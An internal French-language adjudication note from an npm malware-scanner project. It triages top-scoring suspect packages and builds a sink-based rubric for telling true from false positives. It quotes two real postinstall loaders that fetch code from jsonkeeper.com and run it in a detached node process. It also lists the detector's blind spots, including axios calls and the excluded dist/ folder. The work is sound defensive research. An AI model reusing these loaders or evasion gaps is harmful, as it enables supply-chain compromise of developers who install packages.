# FPR — Adjudication aveugle des top-suspects + rubric (2026-06-14) — Chantier FPR, Étape A

Lecture **en aveugle** du vrai code (tarballs `archive/2026-06-1{3,4}/`), pas des labels MUAD'DIB.
But : fabriquer le rubric TP/FP pour `credential_regex_harvest` & co. avant de mesurer (Étape B) /
corriger (Étape C). Méthode : extraire le tgz → lire les fichiers flaggés + les hooks d'install →
trancher sur le **sink** atteint, pas sur la forme du signal.

## TL;DR (réponse à « les top suspects sont-ils FP ou réels ? »)
Le top band (score 145-150 du daily) est **majoritairement FP**. Sur 9 top-suspects distincts :
- **2 TP confirmés** : `chalk-pro`, `richtext-editor-ui` — **même campagne** (staged loader `jsonkeeper.com`).
- **1 incertain → lean FP** : `xzcbailz` (fork Baileys ; `newsletter_hijack` a probablement misfire sur du Baileys stock).
- **6 FP** : `@kinoshitastudio/noa`, `@lordofdestiny/mynumber`, `mandrel`, `vibes-prompt-runner`, `xp-gate` (×2 scopes), `opticore-asymmetric-cryption`.

**Conséquence** : l'intuition « le sommet est réel » ne tient pas (≈2/9 réels). Et les 2 vrais le sont
via leur **postinstall → jsonkeeper.com**, PAS via leurs signaux d'en-tête (`credential_regex_harvest`,
`detached_process`…) — qui tirent aussi sur 6 outils légitimes. **Le score ne discrimine rien** :
TP et FP coexistent à 150. Le seul discriminant est le **sink-coupling**.

## Campagne identifiée : staged loader `jsonkeeper.com` (2 packages, 1 acteur)
- **chalk-pro@7.0.4** — masqué en « chalk » mais c'est **nodemailer trojanisé** + deps réseau ajoutées
  (`axios`, `request`, `socket.io-client`, `sqlite3`). `postinstall: node lib/utils/index.js` →
  `spawn(node, lib/utils/smtp-connection/index.js, {detached, stdio:['ignore','ignore','ignore']}).unref()`.
  Payload (`lib/utils/smtp-connection/index.js`) :
  ```js
  axios.get("https://www.jsonkeeper.com/b/TOAAK").then(r => new Function("require", r.data.cookie)(require))
  ```
- **richtext-editor-ui@1.0.0** — `postinstall.js` direct :
  ```js
  const s1 = (await axios.get(atob("…jsonkeeper.com/b/7EBZP"))).data.content;
  const child = spawn('node', [], {detached:true, stdio:['pipe','ignore','ignore']});
  child.stdin.write(s1); child.stdin.end(); child.unref();
  ```
Même C2 (`jsonkeeper.com/b/*`), même technique (fetch HTTP → exec dans un `node` détaché). → samples GT
**TP** + IOC `jsonkeeper.com` (paste-site C2). À cross-check : statut takedown npm + autres packages du même acteur.

## Verdicts (en aveugle, payload vérifié)

### Top band — daily 2026-06-14 (score 145-150)
| Package | Sig. d'en-tête | Ce que c'est réellement | Sink atteint ? | Verdict |
|---|---|---|---|---|
| **chalk-pro@7.0.4** | cred_harvest, silent_stealth_process, detached_process, suspicious_domain | nodemailer trojanisé republié « chalk » ; postinstall → spawn furtif détaché | **OUI** — fetch+exec `jsonkeeper.com` | **TP** ✅ |
| **richtext-editor-ui@1.0.0** | detached_process, lifecycle_file_exec | postinstall → atob→axios.get→pipe code distant dans node détaché | **OUI** — `jsonkeeper.com` | **TP** ✅ |
| xzcbailz@1.0.3 | newsletter_hijack, git_dep_rce, cred_harvest | fork Baileys (WhatsApp) ; preinstall = check version Node bénin ; « newsletter » = code Baileys **stock** | non trouvé | **UNCERTAIN→FP** (à diff vs upstream) |
| @kinoshitastudio/noa@0.1.0 | direct_ip_exfil, hidden_payload, env | web-terminal `node-pty`+`ws` (auth token, anti-traversal) ; IP Tailscale **hardcodée dans un console.log** | non (IP en log ≠ exfil) | **FP** |
| @lordofdestiny/mynumber@1.5.2 | native_addon_install, dangerous_exec | addon C++ via `@mapbox/node-pre-gyp` (prebuilt / node-gyp) | non | **FP** |
| mandrel@1.64.0 | 44× dynamic_import | CLI qualité-code/agents ; postinstall best-effort `mandrel sync` (no net/no shell documenté) | non | **FP** |
| vibes-prompt-runner@0.1.0-beta.2 | dangerous_exec, lifecycle_file_exec | harnais test WebdriverIO+VS Code ; postinstall patch ses propres node_modules + codesign local | non | **FP** |
| xp-gate@0.5.1 (+ @boyingliu01/xp-gate) | git_hooks_injection, credential_tampering | gate qualité-code à hooks git (style husky), **0 dep**, adapters multi-langages | non | **FP** |
| opticore-asymmetric-cryption@1.0.0 | typosquat_require, typosquat_lifecycle | lib RSA d'une famille vendor `opticore-*` (guyzoum77) ; postinstall = banner `cfonts`/`chalk` cosmétique | non | **FP** (typosquat-compound misfire) |

### Mid band — `credential_regex_harvest` à score 20 (la vraie zone FP-dense)
| Package | Ce que c'est | Verdict |
|---|---|---|
| react-markup@0.0.0-exp | build **React officiel** minifié (`cjs/*.development.js` 689 KB), 0 dep, 0 script | **FP** (bundle framework) |
| @floless/app@0.18.1 | launcher d'app **locale** (SEA, skills, web UI), 0 dep, **aucun hook install** ; detached = son propre serveur local | **FP** |
| @remotion/whisper-web@4.0.477 | Whisper STT WASM ; `remote_code_load` = download modèle `huggingface.co/ggerganov/whisper.cpp/...` (host ML first-party) | **FP** |
| @vxrn/react-native-prebuilt | renderers React/React-Native **vendored** (`ReactFabric-dev.js`…) ; **0 fetch/ws**, pas de hook install ; `proxy`/`override` = code RN | **FP** |
| @kilocode/cli-darwin-x64@7.3.44 | CLI IA (174 MB, binaire prebuilt + assets Shiki) ; `websocket_c2`/hosts = **catalogue providers LLM** (opencode.ai, zenmux.ai, perplexity, cloudflare…) | **FP** |
| Survey ledger (même bande) : `@sveltejs/kit`, `playwright`, `@porsche-design-system/components-js`, `@module-federation/vite`, `claude-flow` | frameworks / CLIs / outils majeurs | **cluster FP** (bundles/minifié) |

## Le rubric (`credential_regex_harvest` + signaux exec/lifecycle)
`credential_regex_harvest` = match regex sur des **chaînes en forme de credential** → quasi sans valeur
seul. Confirmé en tirant sur : code SMTP/oauth de nodemailer (chalk-pro), bundles React/SvelteKit/Playwright,
tables MIME & `well-known/services.json` (TLDs `.ga/.ml/.ru` → faux `suspicious_domain` aussi).

**Discriminant TP vs FP = le sink — ET la réputation du host du sink.** Le test n'est PAS « charge-t-il du
code distant » (kilocode, remotion le font **légitimement**), c'est : **exec de code distant / exfil vers un host
ANORMAL**.
- **TP** : (a) **exec de code fetché** via `new Function`/`eval`/`node` détaché-stdin, OU exfil de credential/env, **vers un host anormal** — paste-site (`jsonkeeper`, `pastebin`, `ghostbin`), dyn-DNS, **IP brute**, host non-marqué ; (b) déclenché par **hook lifecycle** (postinstall/preinstall) ou **process détaché/furtif** (`stdio:ignore`+`unref`). → chalk-pro, richtext (tous deux `jsonkeeper.com`).
- **FP** (indicateurs) : remote-load vers **host first-party/connu** — CDN modèle (`huggingface.co`), GitHub Releases, registry npm, **catalogue/API providers LLM** (opencode.ai, zenmux.ai, …) ; match `credential_regex` dans **bundle minifié/vendored** (`dist/`, `cjs/`, `vendor/`, `bundle.js`, webpack) ; match = fixture/`.env.example`/test/template/table de données ; `env` lu pour config **locale** sans egress ; process détaché = **serveur/app local** (noa, floless) ; exec = **build natif** (`node-gyp`/`node-pre-gyp`) ou patch de ses propres `node_modules`.

**Corollaires :**
1. **Le score n'est pas un filtre** : FP et TP à 150 ; et des TP réels existent aussi à bas score → on ne corrige pas par seuil, on corrige par sink.
2. **La « forme » detached/silent n'est pas un filtre** : noa & floless l'ont sans être des attaques (serveur local). Il faut que le process détaché **atteigne** un sink réseau/code-distant.
3. **typosquat-compound & newsletter_hijack misfire** sur des familles vendor cohérentes (opticore-*) et du Baileys stock (xzcbailz).

## Mécanique détecteur (mesurée — le levier exact de C)
- `credential_regex_harvest` (`src/scanner/ast.js:19/175/180` + `handle-post-walk.js:219`) = `hasCredentialRegex`
  (regex literal / `new RegExp` contenant `/bearer|password|secret|token|credential|api.?key/i`) **ET**
  `hasNetworkCallInFile` (`/\b(fetch|https?\.request|https?\.get|dns\.resolve)\b/`) **dans le même fichier**.
  → **aucun dataflow credential→sink, aucune réputation de host** : c'est précisément pourquoi nodemailer
  (regex auth + net), react-markup, sveltekit FP. Le fix = exiger le **flux** credential→sink + host anormal.
- **`axios.*` n'est PAS dans la liste réseau** → gap : un harvester via axios n'émet pas `credential_regex_harvest`
  (rattrapé seulement par `ioc_string_match`/`suspicious_domain`). À élargir la liste réseau en C.
- **`dist/`,`build/`,`out/`,`output/` exclus du scan** (`EXCLUDED_DIRS`, `src/utils.js:11`) ; `cjs/`,`lib/`,racine scannés.
  Asymétrie : malware caché en `dist/` non vu ; libs livrant en `cjs/`/racine FP (react-markup fire via `cjs/`).

## Implications Étape C (à valider en Étape B, ne pas présupposer)
- Conditionner l'escalade de `credential_regex_harvest` et `lifecycle_script`/exec à une **reachability-to-sink**
  (réseau non-first-party / remote-load / process furtif qui exfil) — réutiliser `src/scanner/reachability.js`
  + le système de compounds + le malice-floor Track-R. **Pas** de downweight aveugle (les positifs doivent rester TP **par leur sink**).
- Garde-fou : tout changement → gates `tests/samples/sink-coupling-fp/` (voir MANIFEST) + backtest archive même-jour ; FPR↓, TPR inchangé.

## État de l'Étape A
- ✅ **Sink-candidates lus** (kilocode / remotion-whisper / vxrn-prebuilt) → tous **FP**, rubric sans faux-négatif, discriminant affiné (host-réputation).
- ✅ **Rubric figé** (sink + host-réputation) + **mécanique détecteur** mesurée (ci-dessus).
- ✅ **Fixtures de gate créées** + vérifiées au scan (`tests/samples/sink-coupling-fp/` + `…/staged-loader/`, voir `MANIFEST.md`) :
  négatifs `framework-bundle` (`credential_regex_harvest`), `native-addon` (`native_addon_install`), `vendor-banner` (`typosquat_lifecycle`) ;
  positifs `credential-harvest-exfil` (`credential_regex_harvest`+sink), `postinstall-detached-loader` (lifecycle+remote-load).
  Paires symétriques : **même signal, sink seul discriminant** → spec directe des tests Étape C.
- ⏳ Statut npm (live/unpublished/maintainer) pour les 2 TP + acteur jsonkeeper — **différé** (sujet campagne séparé ; chalk-pro déjà retiré de npm).
- ⏳ Entrées GT `attacks.json` (chalk-pro, richtext) — pour la mesure Étape B.

## Bilan top band (réponse à la question)
9 top-suspects distincts à score 145-150 : **2 TP** (chalk-pro, richtext — 1 seule campagne), **1 incertain→FP** (xzcbailz), **6 FP** (noa, mynumber, mandrel, vibes, xp-gate, opticore). + 5 mid-band lus = 5 FP. **Bilan adjudication : 2 TP / 14 FP-ou-incertain.** Le score ne discrimine pas (TP et FP à 150) ; seul le **sink vers host anormal** tranche.
